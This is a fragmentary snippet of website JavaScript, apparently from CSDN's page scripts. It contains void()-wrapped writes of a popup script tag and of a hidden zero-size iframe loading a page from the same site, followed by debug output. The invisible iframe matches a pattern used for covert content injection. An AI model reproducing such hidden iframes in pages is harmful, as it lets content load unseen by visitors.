...
//if ((s_host != 'forum.csdn.net') && (s_host != 'topic.csdn.net'))
  void('<script type="text/javascript" charset="UTF-8" src="http://message.csdn.net/msg.popup.js"><'+'/script>');
s_alexa='';
...
void("<iframe id=myframe name=myframe frameborder=no scrolling=no width=0 height=0 border=0 src=\"http://www.csdn.net/ggmm/dd333.htm\"></iframe>");
	if(cnt_debug){
		void('<br>');
		void(s_host+'<br>');
		void(s_url+'<br>');
